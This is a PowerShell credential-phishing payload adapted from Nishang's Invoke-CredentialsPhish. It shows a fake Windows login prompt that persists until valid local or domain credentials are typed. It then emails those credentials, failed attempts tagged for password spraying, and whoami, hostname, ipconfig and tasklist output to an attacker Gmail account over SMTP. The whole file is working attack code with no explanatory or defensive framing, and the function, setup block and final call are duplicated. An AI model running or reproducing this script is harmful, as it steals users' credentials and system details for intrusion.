function Invoke-CredentialsPhish
{
<#
.SYNOPSIS
Nishang script which opens a user credential prompt.
.DESCRIPTION
This payload opens a prompt which asks for user credentials and does not go away till valid local or domain credentials are entered in the prompt.
.EXAMPLE
PS > Invoke-CredentialsPhish
.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang
#>

[CmdletBinding()]
Param ()

    $ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
    while($true)
    {
        $credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter user credentials", "$env:username","")
        if($credential)
        {
            $creds = $credential.GetNetworkCredential()
            [String]$user = $creds.username
            [String]$pass = $creds.password
            [String]$domain = $env:userdomain
            [String]$full_domain = [String]$domain + "\" + $user
            $authlocal = $DS.ValidateCredentials($user, $pass)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
            {
                $local_creds= "Username: " + $user + " Password: " + $pass + " Domain:" + $full_domain
		# SEND SECOND EMAIL CONTAINING VALID SYSTEM CREDENTIALS

		$System_Subject = "SYSTEM CREDENTIALS HIJACKED (VALID CREDS) !!!!"
		$newline = "`r`n"
		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -Port $SmtpPort -UseSsl -Credential $Credentials
                break
            }
	    else{
	    	$local_creds= "Username: " + $user + " Password: " + $pass + " Domain:" + $full_domain
		# SEND EMAIL CONTAINING INVALID SYSTEM CREDENTIALS , CAN BE USED FOR PASSWORD SPRAYING

		$System_Subject = "SYSTEM CREDENTIALS HIJACKED (INVALID CREDS) !!!!"
		$newline = "`r`n"
		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -Port $SmtpPort -UseSsl -Credential $Credentials
        }
    }
}
}

$SmtpServer = 'smtp.gmail.com'
$SmtpPort = 587
$SmtpUser = 'attacker@gmail.com'
$smtpPassword = 'attackeremailpassword'
$MailtTo = 'attacker@gmail.com'
$MailFrom = 'attacker@gmail.com'
$MailSubject = "PAYLOAD EXECUTED !!!!"
$Content  = $output
$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) 




# SEND FIRST EMAIL FOR SYSTEM INFO

$username_command = whoami
$hostname_command = hostname
$ipaddr_command = ipconfig
$tasklist_command = tasklist
$tasklist_command_b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($tasklist_command))


$username_output = "Username : "
$hostname_output = "Hostname : "
$tasklist_output = "Processes Running : "
$ip_output = "IP : "
$newline = "`r`n"

$sysinfo = $username_output+$username_command+$newline+$hostname_output+$hostname_command+$newline+$ip_output+$ipaddr_command+$newline+$tasklist_output+$tasklist_command_b64+$newline


function Invoke-CredentialsPhish
{
<#
.SYNOPSIS
Nishang script which opens a user credential prompt.
.DESCRIPTION
This payload opens a prompt which asks for user credentials and does not go away till valid local or domain credentials are entered in the prompt.
.EXAMPLE
PS > Invoke-CredentialsPhish
.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang
#>

[CmdletBinding()]
Param ()

    $ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
    while($true)
    {
        $credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter user credentials", "$env:username","")
        if($credential)
        {
            $creds = $credential.GetNetworkCredential()
            [String]$user = $creds.username
            [String]$pass = $creds.password
            [String]$domain = $env:userdomain
            [String]$full_domain = [String]$domain + "\" + $user
            $authlocal = $DS.ValidateCredentials($user, $pass)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
            {
                $local_creds= "Username: " + $user + " Password: " + $pass + " Domain:" + $full_domain
		# SEND SECOND EMAIL CONTAINING VALID SYSTEM CREDENTIALS

		$System_Subject = "SYSTEM CREDENTIALS HIJACKED (VALID CREDS) !!!!"
		$newline = "`r`n"
		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -Port $SmtpPort -UseSsl -Credential $Credentials
                exit
            }
	    else{
	    	$local_creds= "Username: " + $user + " Password: " + $pass + " Domain:" + $full_domain
		# SEND EMAIL CONTAINING INVALID SYSTEM CREDENTIALS , CAN BE USED FOR PASSWORD SPRAYING

		$System_Subject = "SYSTEM CREDENTIALS HIJACKED (INVALID CREDS) !!!!"
		$newline = "`r`n"
		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -Port $SmtpPort -UseSsl -Credential $Credentials
        }
    }
}
}

 
$SmtpServer = 'smtp.gmail.com'
$SmtpPort = 587
$SmtpUser = 'attacker@gmail.com'
$smtpPassword = 'attackeremailpassword'
$MailtTo = 'attacker@gmail.com'
$MailFrom = 'attacker@gmail.com'
$MailSubject = "PAYLOAD EXECUTED !!!!"
$Content  = $output
$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) 


# SEND FIRST EMAIL FOR SYSTEM INFO

$username_command = whoami
$hostname_command = hostname
$ipaddr_command = ipconfig
$tasklist_command = tasklist
$tasklist_command_b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($tasklist_command))


$username_output = "Username : "
$hostname_output = "Hostname : "
$tasklist_output = "Processes Running : "
$ip_output = "IP : "
$newline = "`r`n"

$sysinfo = $username_output+$username_command+$newline+$hostname_output+$hostname_command+$newline+$ip_output+$ipaddr_command+$newline+$tasklist_output+$tasklist_command_b64+$newline

Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $MailSubject -Body $sysinfo -SmtpServer $SmtpServer -Port $SmtpPort -UseSsl -Credential $Credentials


# SEND SECOND EMAIL IF USER ENTER SYSTEM CREDENTIALS

Invoke-CredentialsPhish











# SEND SECOND EMAIL IF USER ENTER SYSTEM CREDENTIALS

Invoke-CredentialsPhish







